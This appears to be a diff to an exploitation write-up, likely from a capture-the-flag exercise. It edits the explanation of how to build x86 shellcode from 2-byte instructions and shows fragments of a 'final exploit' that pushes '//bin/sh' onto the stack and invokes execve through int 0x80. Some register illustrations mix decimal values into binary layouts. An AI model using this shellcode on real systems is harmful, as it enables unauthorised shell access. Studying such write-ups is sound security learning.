@@ -110,18 +110,18 @@ Let's focus on how to trim each instruction to 2-bytes. If we now dig deeper int
 
 ```console
 eax -> 00000000 00000000 00000000 00000000 
-## If we set eax to something, say 104 -> mov eax, 104
+## If we set eax to something, say 104 -> mov al, 104
 eax -> 00000000 00000000 00000000 00000104
-## The equivalent of this -> mov al, 104
 ## eax is 32 bit or 4 bytes long
 ## So, if can move the value towards the MSB we would have a 2-byte instruction.
+```
+
+To make a 2 byte instruction in `eax` we should keep multiplying `eax` into `16*16`. Since the binary for `256` is `100000000`, this would shift the value in `eax` by 8 bits. Which would inturn to this.
+
+```console
 eax -> 00000000 00000000 00000104 00000000
 ## Now eax contains a 2-byte instruction
 ```
-To make a 2 byte instruction in `eax` we should keep multiplying `eax` into `16 * 16`. Since the binary for `256` is `100000000`, this would shift the value in eax by 8 bits.
-
-We then clear all the general purpose registers, set them to 0. An easy way to do this is 
-`xor eax, eax`, `xor ebx, ebx` .. etc.
 
 Here is the final exploit.
 
@@ -146,7 +146,7 @@ mov bl, 16
 push ecx
 nop
 
-/* n/sh */
+/* n/sh -> (110, 47, 115, 104) */
 mov al, 104
 mul ebx
 mul ebx
@@ -160,7 +160,7 @@ mov al, 110
 push eax
 nop
 
-/* //bi */
+/* //bi -> (47, 47, 98, 105) */
 xor eax, eax
 mov al, 105
 mul ebx
@@ -181,7 +181,7 @@ mov al, 11
 mov ebx, esp
 int 0x80
 
-/* exit call remove ebx */
+/* exit call to set ebx to 0*/
 mov al, 1
 xor ebx, ebx
 int 0x80
